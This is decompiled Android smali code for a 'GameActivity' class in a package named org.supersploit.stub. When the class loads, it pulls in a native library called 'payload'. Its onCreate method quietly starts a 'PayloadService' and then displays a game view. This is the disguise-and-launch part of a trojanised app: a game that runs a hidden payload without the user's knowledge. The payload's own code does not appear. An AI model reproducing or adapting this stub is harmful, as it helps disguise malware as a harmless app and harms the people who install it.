.class public Lorg/supersploit/stub/GameActivity;
.super Landroid/app/Activity;
.source "GameActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lorg/supersploit/stub/GameActivity$GameView;,
        Lorg/supersploit/stub/GameActivity$Pipe;
    }
.end annotation


# instance fields
.field private gameView:Lorg/supersploit/stub/GameActivity$GameView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 20
    const-string v0, "payload"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    .line 21
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 27
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 30
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lorg/supersploit/stub/PayloadService;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 31
    invoke-virtual {p0, p1}, Lorg/supersploit/stub/GameActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 33
    new-instance p1, Lorg/supersploit/stub/GameActivity$GameView;

    invoke-direct {p1, p0, p0}, Lorg/supersploit/stub/GameActivity$GameView;-><init>(Lorg/supersploit/stub/GameActivity;Landroid/content/Context;)V

    iput-object p1, p0, Lorg/supersploit/stub/GameActivity;->gameView:Lorg/supersploit/stub/GameActivity$GameView;

    .line 34
    iget-object p1, p0, Lorg/supersploit/stub/GameActivity;->gameView:Lorg/supersploit/stub/GameActivity$GameView;

    invoke-virtual {p0, p1}, Lorg/supersploit/stub/GameActivity;->setContentView(Landroid/view/View;)V

    .line 35
    return-void
.end method
